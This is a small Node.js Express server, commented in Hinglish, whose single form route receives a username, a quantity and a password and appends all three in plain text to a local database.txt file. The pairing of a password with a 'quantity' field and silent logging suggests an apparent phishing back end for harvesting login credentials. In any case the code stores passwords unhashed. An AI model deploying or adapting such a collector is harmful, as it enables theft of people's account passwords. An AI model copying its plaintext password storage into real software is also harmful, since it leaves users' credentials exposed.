const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs'); // File save karne ke liye
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/submit-data', (req, res) => {
    const { username, quantity, password } = req.body;

    // Data ko text format mein taiyar karna
    const logEntry = `Time: ${new Date().toLocaleString()} | User: ${username} | Qty: ${quantity} | Pass: ${password}\n`;

    // database.txt file mein data append (add) karna
    fs.appendFile(path.join(__dirname, 'database.txt'), logEntry, (err) => {
        if (err) {
            console.error("Data save karne mein error aaya:", err);
        } else {
            console.log(`[SAVED] Data successfully saved for: ${username}`);
        }
    });

    res.json({ status: 'success', message: 'Data received successfully' });
});

app.listen(PORT, () => {
    console.log(`Server chal raha hai: http://localhost:${PORT}`);
});
